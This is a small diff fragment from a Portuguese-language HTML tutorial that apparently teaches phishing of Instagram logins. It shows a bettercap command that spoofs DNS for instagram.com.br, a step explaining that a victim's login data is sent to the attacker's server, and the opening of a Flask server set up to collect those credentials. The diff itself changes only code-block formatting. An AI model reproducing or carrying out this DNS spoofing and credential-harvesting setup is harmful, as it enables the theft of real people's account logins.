@@ -55,7 +55,8 @@ sudo bettercap -iface wlan0 -eval "set dns.spoof.domains instagram.com.br; set d
 <h3>Passo 5: Coletar os dados</h3>
 <p>Quando a vítima acessar a página falsa e preencher o formulário de login, os dados serão enviados para o servidor especificado no atributo action do formulário.</p>
 <p>Se você estiver usando Flask, você pode configurar um servidor para coletar esses dados:</p>
-<pre><code>
+<pre>
+<code>
 from flask import Flask, request
 
 app = Flask(__name__)
